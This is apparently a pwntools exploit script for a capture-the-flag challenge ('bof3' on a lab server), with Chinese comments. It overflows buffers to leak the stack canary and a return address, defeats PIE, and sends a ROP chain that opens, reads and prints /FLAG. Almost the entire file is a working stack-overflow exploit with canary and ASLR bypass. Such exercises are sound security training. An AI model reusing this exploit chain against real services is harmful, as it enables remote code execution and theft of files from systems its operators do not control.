#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import * # Imports asm, context, remote, log, u64, p64, ELF etc.
import sys
import time

# --- Configuration ---
# 這些是您從 objdump/GDB 分析 bof2 中得到的偏移量
OFFSET_RETURN_SITE_FROM_BASE = 0x9c83 # task() 返回到 main() 的下一條指令的靜態偏移
# OFFSET_MSG_FROM_BASE = 0xef220 # 不再直接使用，ROP 使用 .bss 或堆疊

context.arch = 'amd64'
context.os = 'linux'
context.endian = "little"
context.log_level = 'info' # 可以設為 'debug' 以查看更詳細的輸出

BINARY_NAME = "./bof3" # <--- 請確保這是 Challenge 4 的二進制檔名
try:
    e = ELF(BINARY_NAME) # 使用變數名 'e'
except ELFError:
    log.error(f"Could not load ELF file: {BINARY_NAME}.")
    sys.exit(1)

# --- Connection ---
r = remote('up.zoolab.org', 12344) # Challenge 4 port

leaked_canary = 0
leaked_task_ret_addr = 0 # 指向 main 的返回位址
executable_base = 0

try:
    # --- Stage 1: Leak Canary ---
    # GDB: buf1(rbp-0xc0), buf2(rbp-0x90), buf3(rbp-0x60), msg(rbp-0x30), Canary(rbp-0x8)
    # 我們用 buf1 (rbp-0xc0) 的 printf 來洩漏。
    # 填充從 buf1 起始到 Canary LSB 前 = (rbp-0x8) - (rbp-0xc0) = 0xb8 = 184 bytes.
    # 發送 185 個 'A'，第 185 個 'A' 覆蓋 Canary LSB (\x00)。
    # printf("%s", buf1) 會印出 185 'A's + 7 MSBs of Canary.
    
    padding_s1_overwrite_canary_lsb = 185
    payload_s1_leak_canary = b'A' * padding_s1_overwrite_canary_lsb
    
    r.recvuntil(b"What's your name? ") # This read is for buf1 (rbp-0xc0)
    log.info(f"Stage 1: Sending {len(payload_s1_leak_canary)} 'A's to buf1 to leak canary...")
    r.send(payload_s1_leak_canary) 

    output_s1 = r.recvuntil(b"\nWhat's the room number? ", timeout=5.0)
    log.info("--- Debugging Canary Leak (Stage 1 Output) ---")
    log.info(f"Raw output: {repr(output_s1)}")
    
    try:
        welcome_prefix = b"Welcome, "
        idx_after_welcome = output_s1.index(welcome_prefix) + len(welcome_prefix)
        if not output_s1[idx_after_welcome:].startswith(payload_s1_leak_canary):
            raise PwnlibException("Canary leak: Payload 'A's not found after 'Welcome, '")
        
        canary_material_start_idx = idx_after_welcome + len(payload_s1_leak_canary)
        next_prompt_start_idx = output_s1.index(b"\nWhat's the room number? ", canary_material_start_idx)
        leaked_canary_high_bytes = output_s1[canary_material_start_idx:next_prompt_start_idx]
        
        log.info(f"Bytes visibly leaked for canary (len {len(leaked_canary_high_bytes)}): {leaked_canary_high_bytes.hex()}")

        if len(leaked_canary_high_bytes) >= 7:
            log.warning("Only 7 bytes of canary material found.")
            log.info(f"Bytes visibly leaked for canary : {leaked_canary_high_bytes[0:7].hex()}")
            leaked_canary = u64(b'\x00' + leaked_canary_high_bytes[0:7])
            log.success(f"Reconstructed canary (LSB=00 + 7B): {hex(leaked_canary)}")
        elif len(leaked_canary_high_bytes) == 6:
            log.warning("Only 6 bytes of canary material found.")
            leaked_canary = u64(b'\x00' + leaked_canary_high_bytes + b'\x00')
            log.success(f"Reconstructed canary (LSB=00 + 7B): {hex(leaked_canary)}")
        else:
            log.error(f"Unexpected length for canary material: {len(leaked_canary_high_bytes)}. Expected 7.")
            raise PwnlibException("Canary material length error")
            
    except Exception as e:
        log.error(f"Error parsing canary leak: {e}")
        r.interactive(); sys.exit(1)

    # --- Stage 2: Leak Return Address (PIE Base) ---
    # GDB: buf1(rbp-0xc0), buf2(rbp-0x90), buf3(rbp-0x60), msg(rbp-0x30)
    # Canary(rbp-0x8), SavedRBP(rbp), RetAddr(rbp+8)
    # 我們透過向 buf2 (rbp-0x90) 發送填充來洩漏返回位址。
    # 填充長度以覆蓋到返回位址之前 = (rbp+8) - (rbp-0x90) = 0x98 = 152 bytes.
    # 這會覆蓋 buf2, buf3, msg區域, 金絲雀位置, 和儲存的 RBP 位置。
    padding_s2_to_ret_addr = 152
    payload_s2_leak_retaddr = b'B' * padding_s2_to_ret_addr
    
    log.info(f"Stage 2: Sending {len(payload_s2_leak_retaddr)} 'B's to buf2 to leak return address...")
    # "\nWhat's the room number? " 提示已被消耗。此 read 對應 buf2 (rbp-0x90)
    r.send(payload_s2_leak_retaddr) 

    output_s2 = r.recvuntil(b"\nWhat's the customer's name? ", timeout=5.0)
    log.info("--- Debugging Return Address Leak (Stage 2 Output) ---")
    log.info(f"Raw output: {repr(output_s2)}")

    try:
        room_num_prefix = b"The room number is: "
        idx_after_room_prefix = output_s2.index(room_num_prefix) + len(room_num_prefix)
        if not output_s2[idx_after_room_prefix:].startswith(payload_s2_leak_retaddr):
            raise PwnlibException("RetAddr leak: Payload 'B's not found")

        ret_addr_material_start_idx = idx_after_room_prefix + len(payload_s2_leak_retaddr)
        next_prompt_start_idx_ret = output_s2.index(b"\n", ret_addr_material_start_idx) # 以第一個換行符為界
        leaked_ret_addr_low_bytes = output_s2[ret_addr_material_start_idx:next_prompt_start_idx_ret]

        log.info(f"Bytes visibly leaked for ret_addr (len {len(leaked_ret_addr_low_bytes)}): {leaked_ret_addr_low_bytes.hex()}")

        if len(leaked_ret_addr_low_bytes) == 6: 
            leaked_task_ret_addr = u64(leaked_ret_addr_low_bytes + b"\x00\x00")
            log.success(f"Constructed task return address: {hex(leaked_task_ret_addr)}")
        else:
            log.error(f"Expected 6 LSBs for ret_addr, got {len(leaked_ret_addr_low_bytes)}. RetAddr leak failed.")
            raise PwnlibException("RetAddr leak insufficient/unexpected bytes")
            
        executable_base = leaked_task_ret_addr - OFFSET_RETURN_SITE_FROM_BASE
        e.address = executable_base 
        log.success(f"Calculated executable base: {hex(executable_base)}")

    except Exception as ex_retaddr_parse:
        log.error(f"Error parsing return address leak: {ex_retaddr_parse}")
        r.interactive(); sys.exit(1)

    # --- Stage 3: Construct ROP Chain & Overflow local msg buffer ---
    # GDB: buf1(-0xc0), buf2(-0x90), buf3(-0x60), msg(-0x30), Canary(-0x8)
    # 最終溢位發生在 task() 內的局部變數 msg[40] (位於 rbp-0x30)。
    # 從 msg 的起始 (rbp-0x30) 填充到金絲雀 (rbp-0x8) 之前：
    padding_msg_to_canary = 40 # = 0x28 = 40 bytes.
    
    rop = ROP(e)

    # 在 .bss 段或其他可寫區域規劃字串和緩衝區
    # elf.bss() 給出 .bss 段的靜態偏移，加上 executable_base 得到執行時位址
    flag_str_storage_addr = e.bss() + 0x280 # 選一個 .bss 中的偏移，確保不衝突且可寫
    read_buffer_storage_addr = e.bss() + 0x280 + 0x40 # 在字串之後

    log.info(f"ROP: Address for '/FLAG' string in BSS: {hex(flag_str_storage_addr)}")
    log.info(f"ROP: Address for read buffer in BSS: {hex(read_buffer_storage_addr)}")

    # ROP Chain:
    # 1. read(0, flag_str_storage_addr, 8) ; 讀取 "/FLAG\0\0\0" 到 BSS
    rop.raw(rop.find_gadget(['pop rdi', 'ret']).address)
    rop.raw(0) # fd=0 (stdin)
    rop.raw(rop.find_gadget(['pop rsi', 'ret']).address)
    rop.raw(flag_str_storage_addr) # buf
    rop.raw(rop.find_gadget(['pop rdx', 'ret']).address)
    rop.raw(8) # count
    rop.raw(rop.find_gadget(['pop rax', 'ret']).address)
    rop.raw(constants.SYS_read)
    rop.raw(rop.find_gadget(['syscall', 'ret']).address) # 或 elf.plt['read'] 如果有且可用

    # 2. open(flag_string_storage_addr, O_RDONLY) ; fd 在 rax
    rop.raw(rop.find_gadget(['pop rdi', 'ret']).address)
    rop.raw(flag_str_storage_addr) # pathname
    rop.raw(rop.find_gadget(['pop rsi', 'ret']).address)
    rop.raw(0) # flags = O_RDONLY
    rop.raw(rop.find_gadget(['pop rdx', 'ret']).address)
    rop.raw(0) # mode = 0
    rop.raw(rop.find_gadget(['pop rax', 'ret']).address)
    rop.raw(constants.SYS_open)
    rop.raw(rop.find_gadget(['syscall', 'ret']).address) # rax = fd

    # 3. read(rax_fd, read_buffer_storage_addr, 64) ; 讀取旗標內容
    #   需要將 rax (fd) 移到 rdi。
    #   如果找不到 mov rdi, rax; ret，可以使用 push rax; pop rdi;
    if rop.find_gadget(['push rax', 'ret']) and rop.find_gadget(['pop rdi', 'ret']):
        rop.raw(rop.find_gadget(['push rax', 'ret']).address) # push fd
        rop.raw(rop.find_gadget(['pop rdi', 'ret']).address)  # pop fd to rdi
    else:
        log.warning("ROP: Cannot find 'push rax; ret' or 'pop rdi; ret'. Assuming fd=3 for read(). This is UNRELIABLE.")
        rop.raw(rop.find_gadget(['pop rdi', 'ret']).address)
        rop.raw(3) # Placeholder fd=3
        
    rop.raw(rop.find_gadget(['pop rsi', 'ret']).address)
    rop.raw(read_buffer_storage_addr) # buf
    rop.raw(rop.find_gadget(['pop rdx', 'ret']).address)
    rop.raw(64) # count
    rop.raw(rop.find_gadget(['pop rax', 'ret']).address)
    rop.raw(constants.SYS_read)
    rop.raw(rop.find_gadget(['syscall', 'ret']).address) # rax = bytes_read

    # 4. write(1, read_buffer_storage_addr, rax_bytes_read) ; 印出旗標
    if rop.find_gadget(['push rax', 'ret']) and rop.find_gadget(['pop rdx', 'ret']):
        rop.raw(rop.find_gadget(['push rax', 'ret']).address) # push bytes_read
        rop.raw(rop.find_gadget(['pop rdx', 'ret']).address)  # pop bytes_read to rdx
    else:
        log.warning("ROP: Cannot find 'push rax; ret' or 'pop rdx; ret'. Assuming 64 bytes read for write(). This is UNRELIABLE.")
        rop.raw(rop.find_gadget(['pop rdx', 'ret']).address)
        rop.raw(64) # Placeholder count=64
        
    rop.raw(rop.find_gadget(['pop rdi', 'ret']).address)
    rop.raw(1) # fd = stdout
    rop.raw(rop.find_gadget(['pop rsi', 'ret']).address)
    rop.raw(read_buffer_storage_addr) # buf
    # rdx is set
    rop.raw(rop.find_gadget(['pop rax', 'ret']).address)
    rop.raw(constants.SYS_write)
    rop.raw(rop.find_gadget(['syscall', 'ret']).address)

    # 5. exit(0)
    rop.exit(0) # pwntools rop.exit() is usually reliable

    rop_chain_bytes = rop.chain()
    log.info(f"ROP chain generated (length {len(rop_chain_bytes)} bytes)")
    # rop.dump() # 取消註解以查看詳細的 ROP 鏈

    junk_rbp_final = p64(0x4545454545454545) # 'E'*8, 用於覆寫 task 的 saved RBP
    
    final_payload = b'X' * padding_msg_to_canary # 填充 msg[40] (rbp-0x30) 直到金絲雀
    final_payload += p64(leaked_canary)
    final_payload += junk_rbp_final
    final_payload += rop_chain_bytes
    
    # 前兩個提示已經被之前的 recvuntil 消耗
    # 現在是 "What's the customer's name?"，對應 read(0, buf3, 256)
    log.info("Satisfying read into buf3 (customer's name) with simple data...")
    r.sendline(b"CustomerForBuf3") 

    # 現在輪到 `msg` 緩衝區的輸入了
    r.recvuntil(b"Leave your message: ") # 這是讀取到 msg[40] (rbp-0x30) 的提示
    log.info(f"Sending final ROP overflow payload ({len(final_payload)} bytes) to local msg buffer...")
    r.send(final_payload) # read(0, msg, 384) 會讀取這個酬載
    
    # ROP 鏈中的第一個 read(0, flag_string_storage_addr, 8) 需要我們現在輸入 "/FLAG\0"
    time.sleep(0.3) # 給 ROP 鏈一點時間到達第一個 read syscall
    log.info("Sending '/FLAG\\0' for ROP chain's first read()...")
    r.send(b"/FLAG\0\0\0") # 傳送 8 位元組

    log.success("Payloads sent. ROP chain should execute.")
    flag_output = r.recvall(timeout=5.0) # 增加超時以等待 ROP 鏈執行
    log.success("--- FLAG ---")
    if flag_output:
        decoded_output = flag_output.decode(errors='ignore').strip()
        log.info(f"Full output from server after ROP: {repr(decoded_output)}")
        # Attempt to extract only the FLAG part if other text like "Thank you!" is present
        flag_match = re.search(r"FLAG\{[^\}]+\}", decoded_output)
        if flag_match:
            print(flag_match.group(0))
        else:
            log.warning("FLAG pattern not found, printing stripped output:")
            print(decoded_output)
    else:
        log.warning("No flag output received after ROP.")
    log.success("--------------")

except PwnlibException as e:
    log.critical(f"A PwnlibException occurred: {e}")
    # import traceback; traceback.print_exc()
    sys.exit(1) 
except Exception as e:
    log.critical(f"An unexpected Python error occurred: {e}")
    import traceback; traceback.print_exc()
finally:
    if 'r' in locals() and r.connected(): # 檢查 r 是否已定義且連接存在
        r.close()